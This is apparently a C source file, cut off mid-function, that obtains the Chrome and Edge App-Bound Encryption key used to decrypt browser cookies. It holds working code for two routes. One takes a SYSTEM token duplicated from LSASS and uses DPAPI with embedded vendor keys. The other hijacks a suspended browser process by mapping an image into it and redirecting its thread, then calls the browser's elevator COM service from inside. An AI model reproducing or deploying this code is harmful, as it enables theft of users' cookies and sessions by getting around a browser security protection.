/*
 * AbeKey.c - Chromium App-Bound Encryption master key acquisition.
 *
 * Acquisition strategy (first success wins):
 *   1. Elevate (elevated client only): offline unwrap, no browser process is
 *      launched. Reverses the browser's key wrap: strip "APPB", SYSTEM DPAPI
 *      layer, user DPAPI layer, then the vendor private envelope (V1
 *      AES-256-GCM / V2 ChaCha20-Poly1305 fixed keys, V3 CNG-wrapped key, or
 *      a legacy raw 32-byte key). The V1/V2 keys, the V3 mask and the CNG key
 *      names are byte-identical to the ones embedded in the vendors'
 *      elevation_service.exe binaries.
 *   2. Hijack: CreateProcessInternalW(browser, suspended) - no browser code
 *      ever runs. The KernelBase primitive builds a complete parameter block
 *      (desktop, environment) which hand-rolled RTL_USER_PROCESS_PARAMETERS
 *      lack.
 *
 * Hijack mechanism details:
 *   - Map our own PE image into the target (memory copy + base relocations +
 *     per-section page protections + instruction cache flush via NT
 *     syscalls). The client parses Local State via WinRT JSON and patches the
 *     decoded APPB blob into the staging copy, so the payload carries no
 *     parser; only volatile result globals may be written and every COM entry
 *     point is resolved at run time. Our IAT entries for ntdll keep their
 *     absolute addresses: ntdll is mapped at the same base in every process
 *     of a boot session, and the loader resolved them already.
 *   - NtSetContextThread: redirect the initial thread RIP (x64) / PC (ARM64*)
 *     to ZpAbe_PayloadEntry - a zero-argument function, because the initial
 *     thread context does not deliver argument registers. The loader's
 *     LdrInitializeThunk APC still runs first, so the entry executes in a
 *     fully initialized process.
 *   - The payload unwraps the key through the browser's IElevator COM service
 *     (path validation passes: the host exe is the real browser). The
 *     standard marshaler proxy comes from the browser's own machine
 *     registration only; this code never touches the registry and fails
 *     closed when the vendor registration is missing.
 *   - Results are published to volatile globals inside the mapped image and
 *     the payload then parks forever: the process must stay alive until the
 *     client has read the results (a terminated process cannot be read
 *     back). The client polls with NtReadVirtualMemory and reaps the
 *     process; the mapped image dies with the address space - freeing it
 *     remotely while the payload thread may still be running is not safe.
 *
 * Concurrency: one in-flight acquisition per browser (single-flight). The
 * leader runs the expensive phase outside the entry lock and publishes
 * success or a short-lived failure; concurrent callers wait on an NT event
 * and share the leader's result. The cache identity is the SHA-256 of the
 * app_bound_encrypted_key ciphertext, so unrelated Local State rewrites do
 * not invalidate it, while an actual re-wrap does.
 *
 * Browser elevator generations (verified on Edge 151 / Chrome 152):
 *   Edge:   IElevatorEdge {C9C2B807-...} : IElevatorEdgeBase(3) + IElevator,
 *           DecryptData at vtable slot 8.
 *   Chrome: IElevator2Chrome {1BF5208B-...} : IElevator2 : IElevator,
 *           DecryptData at vtable slot 5.
 *
 * Accepted risk (owner decision): the browser image is resolved from the
 * vendor's install locations, including the documented per-user
 * %LOCALAPPDATA% layout, and inherits the client token without signature,
 * architecture or token checks - a tampered per-user browser install already
 * implies a compromised user environment.
 *
 * Architecture: x64 and ARM64/ARM64EC (ARM64EC threads report the ARM64
 * register context while executing native code, so both use CONTEXT.Pc).
 * x86 is not supported and fails fast.
 */

#include "Client.h"

#include <KNSoft/MakeLifeEasier/Data/Json.h>

#include <KNSoft/MakeLifeEasier/MakeLifeEasier.h>
#include <bcrypt.h>
#include <ncrypt.h>
#include <strsafe.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Ncrypt.lib")
#pragma comment(lib, "KNSoft.NDK.WinAPI.lib")

#define ZP_ABE_EDGE             0
#define ZP_ABE_CHROME           1

#define ZP_ABE_KEY_SIZE         32
#define ZP_ABE_BLOB_MAX         2048

/* V1/V2 private envelope: version[1] + nonce[12] + ciphertext[32] + tag[16] */
#define ZP_ABE_V12_ENVELOPE_SIZE 61

/* V3 private envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
#define ZP_ABE_V3_ENVELOPE_SIZE  93

#define ZP_ABE_POLL_SLACK_MS    15
#define ZP_ABE_POLL_COUNT       1000
#define ZP_ABE_WAIT_SLACK_MS    20000
#define ZP_ABE_FAILURE_RETRY_MS 5000

typedef struct _ZP_ABE_BROWSER
{
    GUID Clsid;
    GUID Iid;
    ULONG DecryptSlot;     /* IElevator::DecryptData vtable slot */
    PCWSTR CngKey;         /* persisted envelope key in the SYSTEM profile KSP store (V3) */
    PCWSTR Vendor;
    PCWSTR ExeName;
} ZP_ABE_BROWSER;

static const ZP_ABE_BROWSER ZpAbeBrowsers[] = {
    { {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
      {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
      8, L"Microsoft Edgekey1", L"Microsoft\\Edge", L"msedge.exe" },
    { {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
      {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},
      5, L"Google Chromekey1", L"Google\\Chrome", L"chrome.exe" },
};

/* private envelope constants, embedded byte-identical in the Chrome/Edge
 * elevation_service.exe and documented in the ABE TechWiki write-up */
static const BYTE ZpAbeV1Key[ZP_ABE_KEY_SIZE] = {
    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87
};
static const BYTE ZpAbeV2Key[ZP_ABE_KEY_SIZE] = {
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60
};
static const BYTE ZpAbeV3Mask[ZP_ABE_KEY_SIZE] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90
};

#if defined(_M_IX86)

NTSTATUS
ZpAbeAcquireCookieKey(
    _In_ DWORD Browser,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_opt_ PULONG ResultCode)
{
    (VOID)Browser;
    (VOID)Key;
    if (ResultCode != NULL) *ResultCode = (ULONG)STATUS_NOT_SUPPORTED;
    return STATUS_NOT_SUPPORTED;
}

#else

/* ---- payload: executes inside the loader-initialized browser process ----
 * No CRT state (CRT init never ran there): only intrinsics and dynamically
 * resolved COM entry points. Never returns and never exits the process: the
 * client must be able to read the results, so it stays parked until the
 * client reaps it. */

typedef struct _ZP_ABE_REQUEST
{
    ULONG Browser;
    ULONG BlobLength;                   /* APPB blob, prefix included */
    BYTE Blob[ZP_ABE_BLOB_MAX];
} ZP_ABE_REQUEST;

static ZP_ABE_REQUEST ZpAbe_Request;    /* patched into the staging copy */

static volatile LONG ZpAbe_Pending; /* 0 = running, 1 = finished */
static volatile LONG ZpAbe_Code = (LONG)0x80004005L /* E_FAIL */;
static volatile BYTE ZpAbe_Key[32];

typedef HRESULT (WINAPI *ZP_ABE_DECRYPT_DATA)(PVOID, BSTR, BSTR*, DWORD*);

static VOID
ZpAbe_PayloadEntry(VOID)
{
    static UNICODE_STRING Ole32Dll = RTL_CONSTANT_STRING(L"ole32.dll");
    static UNICODE_STRING OleAut32Dll = RTL_CONSTANT_STRING(L"oleaut32.dll");
    static ANSI_STRING CoInitializeExName = RTL_CONSTANT_STRING("CoInitializeEx");
    static ANSI_STRING CoUninitializeName = RTL_CONSTANT_STRING("CoUninitialize");
    static ANSI_STRING CoCreateInstanceName = RTL_CONSTANT_STRING("CoCreateInstance");
    static ANSI_STRING CoSetProxyBlanketName = RTL_CONSTANT_STRING("CoSetProxyBlanket");
    static ANSI_STRING SysAllocStringByteLenName = RTL_CONSTANT_STRING("SysAllocStringByteLen");
    static ANSI_STRING SysStringByteLenName = RTL_CONSTANT_STRING("SysStringByteLen");
    static ANSI_STRING SysFreeStringName = RTL_CONSTANT_STRING("SysFreeString");
    const ZP_ABE_BROWSER* Browser = NULL;
    HRESULT (WINAPI *CoInitializeExFn)(PVOID, DWORD);
    HRESULT (WINAPI *CoUninitializeFn)(VOID);
    HRESULT (WINAPI *CoCreateInstanceFn)(const GUID*, PVOID, DWORD, const GUID*, PVOID*);
    HRESULT (WINAPI *CoSetProxyBlanketFn)(PVOID, DWORD, DWORD, PCWSTR, DWORD, DWORD, PVOID, DWORD);
    BSTR (WINAPI *SysAllocStringByteLenFn)(PCSTR, UINT);
    UINT (WINAPI *SysStringByteLenFn)(BSTR);
    VOID (WINAPI *SysFreeStringFn)(BSTR);
    PVOID Ole32, OleAut32, Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    DWORD LastError;
    LONG Code = (LONG)0x80004005L;
    HRESULT Hr = E_FAIL;

    if (ZpAbe_Request.Browser < ARRAYSIZE(ZpAbeBrowsers))
    {
        Browser = &ZpAbeBrowsers[ZpAbe_Request.Browser];
    }
    if (Browser != NULL &&
        ZpAbe_Request.BlobLength > 4 &&
        memcmp((PVOID)ZpAbe_Request.Blob, "APPB", 4) == 0 &&
        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &Ole32Dll, &Ole32)) &&
        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &OleAut32Dll, &OleAut32)) &&
        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoInitializeExName, (PVOID*)&CoInitializeExFn)) &&
        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoUninitializeName, (PVOID*)&CoUninitializeFn)) &&
        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoCreateInstanceName, (PVOID*)&CoCreateInstanceFn)) &&
        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoSetProxyBlanketName, (PVOID*)&CoSetProxyBlanketFn)) &&
        NT_SUCCESS(PS_GetProcAddress(OleAut32, &SysAllocStringByteLenName, (PVOID*)&SysAllocStringByteLenFn)) &&
        NT_SUCCESS(PS_GetProcAddress(OleAut32, &SysStringByteLenName, (PVOID*)&SysStringByteLenFn)) &&
        NT_SUCCESS(PS_GetProcAddress(OleAut32, &SysFreeStringName, (PVOID*)&SysFreeStringFn)))
    {
        /* RPC_E_CHANGED_MODE: the thread already has another apartment, still usable */
        HRESULT CoHr = CoInitializeExFn(NULL, COINIT_APARTMENTTHREADED);

        if (SUCCEEDED(CoHr) || CoHr == RPC_E_CHANGED_MODE)
        {
            Hr = CoCreateInstanceFn(&Browser->Clsid,
                                    NULL,
                                    CLSCTX_LOCAL_SERVER,
                                    &Browser->Iid,
                                    &Elevator);
            if (SUCCEEDED(Hr))
            {
                Hr = CoSetProxyBlanketFn(Elevator,
                                         RPC_C_AUTHN_DEFAULT,
                                         RPC_C_AUTHZ_DEFAULT,
                                         NULL,
                                         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                         RPC_C_IMP_LEVEL_IMPERSONATE,
                                         NULL,
                                         EOAC_DYNAMIC_CLOAKING);
                if (SUCCEEDED(Hr))
                {
                    In = SysAllocStringByteLenFn((PCSTR)ZpAbe_Request.Blob + 4,
                                                  ZpAbe_Request.BlobLength - 4);
                    if (In == NULL)
                    {
                        Hr = E_OUTOFMEMORY;
                    } else
                    {
                        Hr = ((ZP_ABE_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                            Elevator, In, &Out, &LastError);
                        if (SUCCEEDED(Hr) && Out != NULL && SysStringByteLenFn(Out) == 32)
                        {
                            RtlCopyMemory((PVOID)ZpAbe_Key, Out, 32);
                            Code = 0;
                        }
                    }
                }
                ((ULONG (WINAPI*)(PVOID))((*(PVOID**)Elevator)[2]))(Elevator);
            }
            if (SUCCEEDED(CoHr))
            {
                CoUninitializeFn();
            }
        }
        /* release the COM allocations in the host (browser) process */
        if (In != NULL)
        {
            SysFreeStringFn(In);
        }
        if (Out != NULL)
        {
            SysFreeStringFn(Out);
        }
    }
    if (Code != 0) Code = (LONG)Hr;
    ZpAbe_Code = Code;
    _InterlockedExchange(&ZpAbe_Pending, 1);
    /* park until the client reaps the process: exiting would destroy the
     * address space before the results have been read */
    for (;;)
    {
        LARGE_INTEGER Delay;

        Delay.QuadPart = -(LONGLONG)1000 * 10000;
        NtDelayExecution(FALSE, &Delay);
    }
}

/* ---- client side ---- */

/* per-browser single-flight cache: Empty -> Loading -> Ready/Failed; waiters
 * block on the notification event and share the leader's result; failures are
 * retryable after a short cooldown; identity is the SHA-256 of the
 * app_bound_encrypted_key ciphertext */

#define ZP_ABE_METHOD_HIJACK  0
#define ZP_ABE_METHOD_ELEVATE 1

typedef struct _ZP_ABE_CACHE_ENTRY
{
    LONG Lock;
    HANDLE Changed;
    LONG State;         /* 0 = empty, 1 = loading, 2 = ready, 3 = failed */
    BYTE BlobHash[32];
    BYTE Key[32];
    LONG Status;
    LONG Result;
    LONG Method;        /* ZP_ABE_METHOD_* */
    LONG Envelope;      /* private envelope version, 0 when unknown/raw */
    ULONGLONG RetryTime;
} ZP_ABE_CACHE_ENTRY;

static ZP_ABE_CACHE_ENTRY ZpAbe_Cache[ARRAYSIZE(ZpAbeBrowsers)];
static LONG ZpAbe_CacheInit; /* 0 = uninitialized, 1 = initializing, 2 = ready */

static
NTSTATUS
ZpAbeEnsureCache(VOID)
{
    NTSTATUS Status = STATUS_SUCCESS;

    if (ZpAbe_CacheInit == 2) return STATUS_SUCCESS;
    if (_InterlockedCompareExchange(&ZpAbe_CacheInit, 1, 0) == 0)
    {
        ULONG Index;

        for (Index = 0; Index < ARRAYSIZE(ZpAbe_Cache); Index++)
        {
            Status = NtCreateEvent(&ZpAbe_Cache[Index].Changed,
                                   EVENT_QUERY_STATE | EVENT_MODIFY_STATE,
                                   NULL,
                                   NotificationEvent,
                                   FALSE);
            if (!NT_SUCCESS(Status)) break;
        }
        _InterlockedExchange(&ZpAbe_CacheInit, NT_SUCCESS(Status) ? 2 : 0);
    }
    else
    {
        LARGE_INTEGER Delay;

        Delay.QuadPart = -(LONGLONG)10000;
        while (ZpAbe_CacheInit == 1) NtDelayExecution(FALSE, &Delay);
        if (ZpAbe_CacheInit != 2) Status = STATUS_UNSUCCESSFUL;
    }
    return Status;
}

static
VOID
ZpAbeAcquireEntry(
    _Inout_ ZP_ABE_CACHE_ENTRY* Entry)
{
    LARGE_INTEGER Delay;

    Delay.QuadPart = -(LONGLONG)10000; /* 1 ms */
    while (_InterlockedCompareExchange(&Entry->Lock, 1, 0) != 0)
    {
        NtDelayExecution(FALSE, &Delay);
    }
}

static
VOID
ZpAbeReleaseEntry(
    _Inout_ ZP_ABE_CACHE_ENTRY* Entry)
{
    _InterlockedExchange(&Entry->Lock, 0);
}

static
NTSTATUS
ZpAbeHashSha256(
    _In_reads_bytes_(Length) const BYTE* Data,
    _In_ ULONG Length,
    _Out_writes_bytes_(32) BYTE Digest[32])
{
    BCRYPT_ALG_HANDLE Algorithm = NULL;
    NTSTATUS Status;

    Status = BCryptOpenAlgorithmProvider(&Algorithm, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(Status))
    {
        Status = BCryptHash(Algorithm, NULL, 0, (PUCHAR)Data, Length, Digest, 32);
        BCryptCloseAlgorithmProvider(Algorithm, 0);
    }
    return Status;
}

static
HRESULT
ZpAbeGetNamedString(
    _In_ IJsonObject* Object,
    _In_ PCWSTR Name,
    _Out_ HSTRING* Value)
{
    HSTRING_HEADER Header;
    HSTRING String;
    HRESULT Hr;

    Hr = _Inline_WindowsCreateStringReference(Name, _STR_LEN(Name), &Header, &String);
    if (FAILED(Hr))
    {
        return Hr;
    }
    return Object->lpVtbl->GetNamedString(Object, String, Value);
}

/* parses Local State via WinRT JSON (requires an apartment on the caller) and
 * base64-decodes os_crypt.app_bound_encrypted_key into Blob ("APPB" kept) */
static
NTSTATUS
ZpAbeReadAppBoundBlob(
    _In_ PCWSTR LocalStatePath,
    _Out_writes_bytes_(ZP_ABE_BLOB_MAX) PBYTE Blob,
    _Out_ PULONG BlobLength)
{
    IJsonValue* Root = NULL;
    IJsonObject* RootObject = NULL;
    IJsonObject* OsCrypt = NULL;
    HSTRING EncodedString = NULL;
    PCWSTR EncodedText;
    DWORD Length = 0;
    HRESULT Hr;
    NTSTATUS Status;

    *BlobLength = 0;
    Hr = Data_JsonParseUtf8File(LocalStatePath, 1024 * 1024, &Root);
    if (SUCCEEDED(Hr)) Hr = Root->lpVtbl->GetObject(Root, &RootObject);
    if (SUCCEEDED(Hr))
    {
        HSTRING_HEADER Header;
        HSTRING Name;

        Hr = _Inline_WindowsCreateStringReference(L"os_crypt", _STR_LEN(L"os_crypt"), &Header, &Name);
        if (SUCCEEDED(Hr))
        {
            Hr = RootObject->lpVtbl->GetNamedObject(RootObject, Name, &OsCrypt);
        }
    }
    if (SUCCEEDED(Hr)) Hr = ZpAbeGetNamedString(OsCrypt, L"app_bound_encrypted_key", &EncodedString);
    if (SUCCEEDED(Hr))
    {
        EncodedText = _Inline_WindowsGetStringRawBuffer(EncodedString, NULL);
        if (!CryptStringToBinaryW(EncodedText,
                                  0,
                                  CRYPT_STRING_BASE64,
                                  NULL,
                                  &Length,
                                  NULL,
                                  NULL) ||
            Length == 0 ||
            Length > ZP_ABE_BLOB_MAX ||
            !CryptStringToBinaryW(EncodedText,
                                  0,
                                  CRYPT_STRING_BASE64,
                                  Blob,
                                  &Length,
                                  NULL,
                                  NULL))
        {
            Hr = HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
        }
    }
    if (SUCCEEDED(Hr) && (Length <= 4 || memcmp(Blob, "APPB", 4) != 0))
    {
        Hr = HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
    }
    if (SUCCEEDED(Hr)) *BlobLength = Length;
    if (EncodedString != NULL) _Inline_WindowsDeleteString(EncodedString);
    if (OsCrypt != NULL) OsCrypt->lpVtbl->Release(OsCrypt);
    if (RootObject != NULL) RootObject->lpVtbl->Release(RootObject);
    if (Root != NULL) Root->lpVtbl->Release(Root);
    Status = FAILED(Hr) ? STATUS_UNSUCCESSFUL : STATUS_SUCCESS;
    return Status;
}

static
NTSTATUS
ZpAbeQueryEnvironment(
    _In_z_ PCWSTR Name,
    _Out_writes_z_(Capacity) PWSTR Value,
    _In_ ULONG Capacity)
{
    UNICODE_STRING NameString, ValueString;

    RtlInitUnicodeString(&NameString, Name);
    ValueString.Buffer = Value;
    ValueString.Length = 0;
    ValueString.MaximumLength = (USHORT)min(Capacity * sizeof(WCHAR), MAXUSHORT);
    return RtlQueryEnvironmentVariable_U(NULL, &NameString, &ValueString);
}

static
BOOLEAN
ZpAbeGetPaths(
    _In_ DWORD Browser,
    _Out_writes_(MAX_PATH) PWSTR Executable,
    _Out_writes_(MAX_PATH) PWSTR LocalState)
{
    static const PCWSTR Names[3] = { L"LOCALAPPDATA", L"ProgramFiles", L"ProgramFiles(x86)" };
    WCHAR Environment[MAX_PATH];
    ULONG Index;

    LocalState[0] = UNICODE_NULL;
    for (Index = 0; Index < ARRAYSIZE(Names); Index++)
    {
        if (!NT_SUCCESS(ZpAbeQueryEnvironment(Names[Index], Environment, MAX_PATH))) continue;
        if (Index == 0 &&
            FAILED(StringCchPrintfW(LocalState,
                                    MAX_PATH,
                                    L"%s\\%s\\User Data\\Local State",
                                    Environment,
                                    ZpAbeBrowsers[Browser].Vendor)))
        {
            return FALSE;
        }
        if (FAILED(StringCchPrintfW(Executable,
                                    MAX_PATH,
                                    L"%s\\%s\\Application\\%s",
                                    Environment,
                                    ZpAbeBrowsers[Browser].Vendor,
                                    ZpAbeBrowsers[Browser].ExeName)))
        {
            continue;
        }
        if (GetFileAttributesW(Executable) != INVALID_FILE_ATTRIBUTES &&
            LocalState[0] != UNICODE_NULL)
        {
            return TRUE;
        }
    }
    return FALSE;
}

/* ---- AEAD helpers (elevate path) ---- */

/* user-mode bcrypt.h does not define it (the KM header does); CNG
   ChaCha20-Poly1305 requires this chaining mode */
#ifndef BCRYPT_CHAIN_MODE_NIST
#define BCRYPT_CHAIN_MODE_NIST L"ChainingModeNIST"
#endif

static
NTSTATUS
ZpAbeAeadOpen(
    _In_ PCWSTR Algorithm,
    _In_ PCWSTR ChainingMode,
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(12) const BYTE* Nonce,
    _In_reads_bytes_(Length) const BYTE* CipherText,
    _In_ ULONG Length,
    _In_reads_bytes_(16) const BYTE* Tag,
    _Out_writes_bytes_(Length) PBYTE Plain)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Auth;
    BCRYPT_ALG_HANDLE Alg = NULL;
    BCRYPT_KEY_HANDLE Cipher = NULL;
    PBYTE Object = NULL;
    ULONG ObjLen, Done, Result;
    NTSTATUS Status;

    Status = BCryptOpenAlgorithmProvider(&Alg, Algorithm, NULL, 0);
    if (NT_SUCCESS(Status))
    {
        Status = BCryptSetProperty(Alg,
                                   BCRYPT_CHAINING_MODE,
                                   (PUCHAR)ChainingMode,
                                   (ULONG)(Str_SizeW(ChainingMode) + sizeof(WCHAR)),
                                   0);
    }
    if (NT_SUCCESS(Status))
    {
        Status = BCryptGetProperty(Alg,
                                   BCRYPT_OBJECT_LENGTH,
                                   (PUCHAR)&ObjLen,
                                   sizeof(ObjLen),
                                   &Done,
                                   0);
    }
    if (NT_SUCCESS(Status))
    {
        Object = Mem_Alloc(ObjLen);
        if (Object == NULL) Status = STATUS_NO_MEMORY;
    }
    if (NT_SUCCESS(Status))
    {
        Status = BCryptGenerateSymmetricKey(Alg, &Cipher, Object, ObjLen, (PUCHAR)Key, 32, 0);
    }
    if (NT_SUCCESS(Status))
    {
        BCRYPT_INIT_AUTH_MODE_INFO(Auth);
        Auth.pbNonce = (PUCHAR)Nonce;
        Auth.cbNonce = 12;
        Auth.pbTag = (PUCHAR)Tag;
        Auth.cbTag = 16;
        Status = BCryptDecrypt(Cipher,
                               (PUCHAR)CipherText,
                               Length,
                               &Auth,
                               NULL,
                               0,
                               Plain,
                               Length,
                               &Result,
                               0);
    }
    if (Cipher != NULL)
    {
        BCryptDestroyKey(Cipher);
    }
    if (Object != NULL)
    {
        RtlSecureZeroMemory(Object, ObjLen);
        Mem_Free(Object);
    }
    BCryptCloseAlgorithmProvider(Alg, 0);
    return Status;
}

/* V1/V2 envelope unwrap with the fixed embedded keys */
static
BOOLEAN
ZpAbeV1V2Unwrap(
    _In_ ULONG EnvelopeVersion,
    _In_reads_bytes_(ZP_ABE_V12_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(32) PBYTE Key)
{
    NTSTATUS Status;

    Status = EnvelopeVersion == 1 ?
        ZpAbeAeadOpen(BCRYPT_AES_ALGORITHM,
                      BCRYPT_CHAIN_MODE_GCM,
                      ZpAbeV1Key,
                      Envelope + 1,
                      Envelope + 13,
                      32,
                      Envelope + 45,
                      Key) :
        ZpAbeAeadOpen(BCRYPT_CHACHA20_POLY1305_ALGORITHM,
                      BCRYPT_CHAIN_MODE_NIST,
                      ZpAbeV2Key,
                      Envelope + 1,
                      Envelope + 13,
                      32,
                      Envelope + 45,
                      Key);
    return NT_SUCCESS(Status);
}

/* V3 envelope unwrap; must run impersonating SYSTEM (the CNG key lives in the
   SYSTEM profile's Microsoft Software KSP store) */
static
BOOLEAN
ZpAbeV3Unwrap(
    _In_ const ZP_ABE_BROWSER* Browser,
    _In_reads_bytes_(ZP_ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(32) PBYTE Key)
{
    NCRYPT_PROV_HANDLE Provider = 0;
    NCRYPT_KEY_HANDLE CngKey = 0;
    BYTE Derived[ZP_ABE_KEY_SIZE];
    DWORD Length;
    SECURITY_STATUS St;
    NTSTATUS Status;
    ULONG i;

    St = NCryptOpenStorageProvider(&Provider, MS_KEY_STORAGE_PROVIDER, 0);
    if (FAILED(St))
    {
        return FALSE;
    }
    St = NCryptOpenKey(Provider, &CngKey, Browser->CngKey, 0, 0);
    if (FAILED(St))
    {
        NCryptFreeObject(Provider);
        return FALSE;
    }

    /* raw 32->32 decrypt, as done by the browsers' elevation service */
    St = NCryptDecrypt(CngKey,
                       (PBYTE)Envelope + 1,
                       ZP_ABE_KEY_SIZE,
                       NULL,
                       Derived,
                       sizeof(Derived),
                       &Length,
                       NCRYPT_SILENT_FLAG);
    NCryptFreeObject(CngKey);
    NCryptFreeObject(Provider);
    if (FAILED(St) || Length != ZP_ABE_KEY_SIZE)
    {
        return FALSE;
    }
    for (i = 0; i < ZP_ABE_KEY_SIZE; i++)
    {
        Derived[i] ^= ZpAbeV3Mask[i];
    }
    /* Envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
    Status = ZpAbeAeadOpen(BCRYPT_AES_ALGORITHM,
                           BCRYPT_CHAIN_MODE_GCM,
                           Derived,
                           Envelope + 33,
                           Envelope + 45,
                           32,
                           Envelope + 77,
                           Key);
    RtlSecureZeroMemory(Derived, sizeof(Derived));
    return NT_SUCCESS(Status);
}

/* innermost user-DPAPI payload: [u32 len][validation data][u32 len][payload];
   legacy Edge carries a raw key, Chrome/Edge a private envelope V1/V2/V3 */
static
BOOLEAN
ZpAbeUnwrapInnerPayload(
    _In_ const ZP_ABE_BROWSER* Browser,
    _In_reads_bytes_(Size) const BYTE* Data,
    _In_ DWORD Size,
    _In_ HANDLE SystemToken,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_ PLONG EnvelopeVersion)
{
    ULONG ValidationLength, PayloadLength;
    const BYTE* Payload;
    NTSTATUS Status;

    if (Size < 8) return FALSE;
    RtlCopyMemory(&ValidationLength, Data, sizeof(ValidationLength));
    if (ValidationLength > Size - 8) return FALSE;
    RtlCopyMemory(&PayloadLength, Data + 4 + ValidationLength, sizeof(PayloadLength));
    Payload = Data + 8 + ValidationLength;
    if (PayloadLength > Size - 8 - ValidationLength) return FALSE;

    if (PayloadLength == ZP_ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
    {
        BOOLEAN Ok;

        /* V3: the CNG unwrap must run as SYSTEM */
        Status = PS_Impersonate(SystemToken);
        if (!NT_SUCCESS(Status)) return FALSE;
        Ok = ZpAbeV3Unwrap(Browser, Payload, Key);
        Status = PS_Impersonate(NULL);
        if (Ok && NT_SUCCESS(Status))
        {
            *EnvelopeVersion = 3;
            return TRUE;
        }
        return FALSE;
    }
    if (PayloadLength == ZP_ABE_V12_ENVELOPE_SIZE && Payload[0] >= 1 && Payload[0] <= 2)
    {
        if (ZpAbeV1V2Unwrap(Payload[0], Payload, Key))
        {
            *EnvelopeVersion = (LONG)Payload[0];
            return TRUE;
        }
        return FALSE;
    }
    if (PayloadLength == ZP_ABE_KEY_SIZE)
    {
        *EnvelopeVersion = 0;
        RtlCopyMemory(Key, Payload, ZP_ABE_KEY_SIZE);
        return TRUE;
    }
    return FALSE;
}

static
BOOLEAN
ZpAbeIsElevated(VOID)
{
    TOKEN_ELEVATION Elevation;
    HANDLE Token;
    ULONG Length;
    NTSTATUS Status;

    if (!NT_SUCCESS(NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &Token)))
    {
        return FALSE;
    }
    Status = NtQueryInformationToken(Token,
                                     TokenElevation,
                                     &Elevation,
                                     sizeof(Elevation),
                                     &Length);
    NtClose(Token);
    return NT_SUCCESS(Status) && Elevation.TokenIsElevated != 0;
}

/* offline unwrap: strip "APPB", SYSTEM DPAPI layer, user DPAPI layer, then
 * the private envelope (admin required; the SYSTEM token is duplicated from
 * LSASS like the vendors' own importers do) */
static
BOOLEAN
ZpAbeAcquireElevated(
    _In_ const ZP_ABE_BROWSER* Browser,
    _In_reads_bytes_(BlobLength) const BYTE* Blob,
    _In_ ULONG BlobLength,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_ PLONG EnvelopeVersion)
{
    DATA_BLOB In, Out = { 0 }, Final = { 0 };
    HANDLE SystemToken = NULL;
    ULONG LsaProcessId;
    BOOLEAN Ok = FALSE;

    *EnvelopeVersion = 0;
    if (!NT_SUCCESS(Sys_GetLsaProcessId(&LsaProcessId)) ||
        !NT_SUCCESS(PS_DuplicateSystemToken(LsaProcessId, TokenImpersonation, &SystemToken)))
    {
        return FALSE;
    }

    /* layer 1: SYSTEM DPAPI */
    In.pbData = (PBYTE)Blob + 4;
    In.cbData = BlobLength - 4;
    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
    {
        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
        {
            PS_Impersonate(NULL);
            goto _Exit;
        }
        if (!NT_SUCCESS(PS_Impersonate(NULL)))
        {
            goto _Exit;
        }
    } else
    {
        goto _Exit;
    }

    /* layer 2: user DPAPI, then unwrap the innermost structure */
    In.pbData = Out.pbData;
    In.cbData = Out.cbData;
    if (CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final))
    {
        Ok = ZpAbeUnwrapInnerPayload(Browser, Final.pbData, Final.cbData, SystemToken, Key, EnvelopeVersion);
        RtlSecureZeroMemory(Final.pbData, Final.cbData);
    }
    if (Out.pbData != NULL)
    {
        RtlSecureZeroMemory(Out.pbData, Out.cbData);
        LocalFree(Out.pbData);
    }
    LocalFree(Final.pbData);

_Exit:
    NtClose(SystemToken);
    return Ok;
}

/* ---- hijack (browser process) ---- */

static
NTSTATUS
ZpAbeMapSelf(
    _In_ HANDLE Process,
    _In_reads_bytes_(sizeof(ZP_ABE_REQUEST)) const ZP_ABE_REQUEST* Request,
